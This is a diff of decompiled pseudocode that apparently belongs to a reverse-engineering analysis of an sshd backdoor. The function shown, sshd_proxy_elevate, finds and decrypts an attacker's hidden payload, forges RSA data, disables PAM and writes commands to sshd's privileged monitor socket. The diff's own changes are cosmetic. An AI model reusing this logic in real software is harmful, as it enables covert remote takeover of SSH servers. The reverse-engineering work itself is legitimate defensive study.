@@ -29,7 +29,6 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   long *plVar7;
   undefined8 *puVar8;
   _func_56 *p_Var9;
-  int fd;
   BOOL BVar10;
   uint uVar11;
   int iVar12;
@@ -107,49 +106,49 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   }
   monitor_fd = -1;
   if (args == (monitor_data_t *)0x0) {
-    return 0;
+    return FALSE;
   }
   pBVar17 = args->rsa_n;
   if (pBVar17 == (BIGNUM *)0x0) {
-    return 0;
+    return FALSE;
   }
   pBVar18 = args->rsa_e;
   if (pBVar18 == (BIGNUM *)0x0) {
-    return 0;
+    return FALSE;
   }
   uVar3 = args->cmd_type;
   if ((uVar3 == 3) && ((args->args->flags2 & 0x40) == 0)) {
     if (args->rsa == (RSA *)0x0) {
-      return 0;
+      return FALSE;
     }
     if (args->payload_body == (u8 *)0x0) {
-      return 0;
+      return FALSE;
     }
     if (args->payload_body_size != 0x30) {
-      return 0;
+      return FALSE;
     }
   }
   if (ctx == (global_context_t *)0x0) {
-    return 0;
+    return FALSE;
   }
   piVar4 = ctx->imported_funcs;
   if (piVar4 == (imported_funcs_t *)0x0) {
-    return 0;
+    return FALSE;
   }
   plVar5 = ctx->libc_imports;
   if (plVar5 == (libc_imports_t *)0x0) {
-    return 0;
+    return FALSE;
   }
   if (plVar5->pselect == (_func_24 *)0x0) {
-    return 0;
+    return FALSE;
   }
   if (plVar5->__errno_location == (_func_26 *)0x0) {
-    return 0;
+    return FALSE;
   }
   psVar6 = ctx->sshd_ctx;
-  if (psVar6->have_mm_answer_keyallowed == 0) {
+  if (psVar6->have_mm_answer_keyallowed == FALSE) {
     if (uVar3 == 0) {
-      return 0;
+      return FALSE;
     }
     pcVar13 = args->args;
     if (uVar3 != 3) {
@@ -163,7 +162,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
       goto LAB_0010843f;
     }
     if ((pcVar13->flags3 & 0x20) != 0) {
-      return 0;
+      return FALSE;
     }
 LAB_0010844c:
     uVar1 = pcVar13->field_0x3;
@@ -195,37 +194,37 @@ LAB_0010845f:
   if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
     if ((pcVar13->flags1 & 0x40) != 0) {
       if (psVar6->use_pam_ptr == (int *)0x0) {
-        return 0;
+        return FALSE;
       }
       *psVar6->use_pam_ptr = 0;
     }
     if ((args->cmd_type == 3) && (bVar21 = pcVar13->flags2 & 0xc0, bVar21 != 0xc0)) {
       if (bVar21 == 0x40) {
         if (plVar5->exit == (_func_19 *)0x0) {
-          return 0;
+          return FALSE;
         }
         (*plVar5->exit)(0);
-        return 0;
+        return FALSE;
       }
       if (args->payload_body_size < 0x30) {
-        return 0;
+        return FALSE;
       }
       plVar7 = (long *)args->payload_body;
       lVar19 = *plVar7;
       sVar20 = plVar7[1];
       if (0x3fef < sVar20 - 0x11) {
-        return 0;
+        return FALSE;
       }
       puVar8 = (undefined8 *)plVar5->__libc_stack_end;
       puVar22 = (undefined8 *)register0x00000020;
       do {
         if (puVar8 <= puVar22) {
-          return 0;
+          return FALSE;
         }
         addr = (long *)*puVar22;
         if ((long *)0xffffff < addr) {
           BVar10 = is_range_mapped((u8 *)addr,0x4001 - sVar20,ctx);
-          if (BVar10 != 0) {
+          if (BVar10 != FALSE) {
             plVar14 = (long *)((0x4001 - sVar20) + (long)addr);
             for (; addr < plVar14; addr = (long *)((long)addr + 1)) {
               local_b20[0] = 0;
@@ -249,10 +248,10 @@ LAB_0010845f:
               payload_hash[0xe] = '\0';
               payload_hash[0xf] = '\0';
               if ((*addr == lVar19) &&
-                 (BVar10 = sha256(addr,sVar20,(u8 *)local_b20,0x20,ctx->imported_funcs), BVar10 != 0
-                 )) {
+                 (BVar10 = sha256(addr,sVar20,(u8 *)local_b20,0x20,ctx->imported_funcs),
+                 BVar10 != FALSE)) {
                 lVar34 = 0;
-                while( true ) {
+                while( TRUE ) {
                   cVar2 = *(char *)((long)plVar7 + lVar34 + 0x10);
                   uVar1 = *(u8 *)((long)local_b20 + lVar34);
                   if ((cVar2 < (char)uVar1) || ((char)uVar1 < cVar2)) break;
@@ -268,15 +267,15 @@ LAB_0010845f:
                       puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                     }
                     BVar10 = secret_data_get_decrypted((u8 *)local_b20,ctx);
-                    if (BVar10 == 0) {
-                      return 0;
+                    if (BVar10 == FALSE) {
+                      return FALSE;
                     }
                     sVar20 = sVar20 - 0x10;
                     puVar26 = (uint *)(addr + 2);
                     BVar10 = chacha_decrypt((u8 *)puVar26,(int)sVar20,(u8 *)local_b20,(u8 *)addr,
                                             (u8 *)puVar26,ctx->imported_funcs);
-                    if (BVar10 == 0) {
-                      return 0;
+                    if (BVar10 == FALSE) {
+                      return FALSE;
                     }
                     goto LAB_00108861;
                   }
@@ -286,7 +285,7 @@ LAB_0010845f:
           }
         }
         puVar22 = puVar22 + 1;
-      } while( true );
+      } while( TRUE );
     }
   }
   pcVar32 = ctx->STR_ssh_rsa_cert_v01_openssh_com;
@@ -349,7 +348,7 @@ LAB_0010845f:
   local_e40 = 0;
   uStack_e38 = 0;
   if (((pcVar32 != (char *)0x0) && (ctx->STR_rsa_sha2_256 != (char *)0x0)) &&
-     (BVar10 = contains_null_pointers(&piVar4->RSA_new,9), BVar10 == 0)) {
+     (BVar10 = contains_null_pointers(&piVar4->RSA_new,9), BVar10 == FALSE)) {
     puVar26 = local_920;
     lVar34 = 0;
     uVar33 = 0;
@@ -388,15 +387,15 @@ LAB_0010845f:
     local_983 = (undefined3)*(undefined4 *)pcVar32;
     uStack_980 = (undefined1)*(undefined4 *)(pcVar32 + 3);
     uStack_97f = (undefined3)((uint)*(undefined4 *)(pcVar32 + 3) >> 8);
-    while( true ) {
+    while( TRUE ) {
       local_e78 = 0;
       BVar10 = bignum_serialize(local_77c + uVar33,bufferSize,&local_e78,local_e70[lVar34],piVar4);
-      if ((BVar10 == 0) || (bufferSize < local_e78)) break;
+      if ((BVar10 == FALSE) || (bufferSize < local_e78)) break;
       uVar33 = uVar33 + local_e78;
       bufferSize = bufferSize - local_e78;
       if (lVar34 != 0) {
         if (0x628 < uVar33) {
-          return 0;
+          return FALSE;
         }
         iVar12 = (int)uVar33;
         uVar11 = iVar12 + 0xb;
@@ -419,7 +418,7 @@ LAB_0010845f:
         }
         r = (*piVar4->RSA_new)();
         if (r == (RSA *)0x0) {
-          return 0;
+          return FALSE;
         }
         pBVar17 = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
         if (pBVar17 != (BIGNUM *)0x0) {
@@ -459,10 +458,10 @@ LAB_00108861:
               pcVar13 = args->args;
               uVar11 = args->cmd_type;
               if (pcVar13 == (cmd_arguments_t *)0x0) {
-                return 0;
+                return FALSE;
               }
               if ((pcVar13->flags1 & 0x20) == 0) {
-                iVar12 = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
+                BVar10 = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
                 if (uVar11 == 2) {
@@ -483,11 +482,11 @@ LAB_001088b7:
                     socket_index = pcVar13->flags3 & 0x1f;
                   }
                 }
-                iVar12 = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
+                BVar10 = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
               }
-              fd = monitor_fd;
-              if (iVar12 == 0) {
-                return 0;
+              iVar12 = monitor_fd;
+              if (BVar10 == FALSE) {
+                return FALSE;
               }
               pcVar13 = args->args;
               uVar3 = args->cmd_type;
@@ -498,27 +497,27 @@ LAB_001088b7:
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
               }
               if (monitor_fd < 0) {
-                return 0;
+                return FALSE;
               }
               if (pcVar13 == (cmd_arguments_t *)0x0) {
-                return 0;
+                return FALSE;
               }
               if (plVar5 == (libc_imports_t *)0x0) {
-                return 0;
+                return FALSE;
               }
               if (plVar5->exit == (_func_19 *)0x0) {
-                return 0;
+                return FALSE;
               }
               if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->flags3 & 0x20) != 0)))) {
                 BVar10 = sshd_get_sshbuf(local_c40,ctx);
-                if (BVar10 == 0) {
-                  return 0;
+                if (BVar10 == FALSE) {
+                  return FALSE;
                 }
                 ctx->exit_flag = pcVar13->flags1 & 1;
               }
-              sVar15 = fd_write(fd,puVar26,sVar20,plVar5);
+              sVar15 = fd_write(iVar12,puVar26,sVar20,plVar5);
               if (sVar15 < 0) {
-                return 0;
+                return FALSE;
               }
               if (uVar3 == 0) {
 LAB_001089b5:
@@ -530,13 +529,13 @@ LAB_001089b5:
                 uVar11 = (int)sVar20 + 1;
                 local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                                uVar11 * 0x1000000;
-                sVar15 = fd_write(fd,local_b20,5,plVar5);
+                sVar15 = fd_write(iVar12,local_b20,5,plVar5);
                 if (sVar15 < 0) {
-                  return 0;
+                  return FALSE;
                 }
-                sVar15 = fd_write(fd,local_c40[0].d,sVar20,plVar5);
+                sVar15 = fd_write(iVar12,local_c40[0].d,sVar20,plVar5);
                 if (sVar15 < 0) {
-                  return 0;
+                  return FALSE;
                 }
                 if (uVar3 != 3) goto LAB_0010897e;
               }
@@ -545,13 +544,13 @@ LAB_001089b5:
                 if ((pcVar13->flags3 & 0x20) != 0) goto LAB_001089b5;
               }
               if (-1 < (char)pcVar13->flags1) {
-                return 1;
+                return TRUE;
               }
 LAB_0010897e:
               local_d40[0] = local_d40[0] & 0xffffffff00000000;
-              sVar15 = fd_read(fd,local_d40,4,plVar5);
+              sVar15 = fd_read(iVar12,local_d40,4,plVar5);
               if (sVar15 < 0) {
-                return 0;
+                return FALSE;
               }
               uVar11 = (uint)local_d40[0] >> 0x18 | ((uint)local_d40[0] & 0xff0000) >> 8 |
                        ((uint)local_d40[0] & 0xff00) << 8 | (uint)local_d40[0] << 0x18;
@@ -559,38 +558,38 @@ LAB_0010897e:
               uVar33 = (ulong)uVar11;
               if (uVar33 != 0) {
                 if (plVar5->read == (_func_25 *)0x0) {
-                  return 0;
+                  return FALSE;
                 }
                 if (plVar5->__errno_location == (_func_26 *)0x0) {
-                  return 0;
+                  return FALSE;
                 }
                 do {
-                  while( true ) {
+                  while( TRUE ) {
                     sVar20 = 0x200;
                     if (uVar33 < 0x201) {
                       sVar20 = uVar33;
                     }
-                    sVar15 = (*plVar5->read)(fd,local_b20,sVar20);
+                    sVar15 = (*plVar5->read)(iVar12,local_b20,sVar20);
                     if (-1 < sVar15) break;
                     piVar16 = (*plVar5->__errno_location)();
                     if (*piVar16 != 4) {
-                      return 0;
+                      return FALSE;
                     }
                   }
                   if (sVar15 == 0) {
-                    return 0;
+                    return FALSE;
                   }
                   uVar33 = uVar33 - sVar15;
                 } while (uVar33 != 0);
               }
               if (uVar3 != 2) {
-                return 1;
+                return TRUE;
               }
               if (plVar5->exit == (_func_19 *)0x0) {
-                return 0;
+                return FALSE;
               }
               (*plVar5->exit)(0);
-              return 1;
+              return TRUE;
             }
           }
         }
@@ -606,14 +605,14 @@ LAB_00108cd2:
           (*ctx->imported_funcs->BN_free)(pBVar18);
         }
         if (d == (BIGNUM *)0x0) {
-          return 0;
+          return FALSE;
         }
         (*ctx->imported_funcs->BN_free)(d);
-        return 0;
+        return FALSE;
       }
       lVar34 = 1;
     }
   }
-  return 0;
+  return FALSE;
 }
 
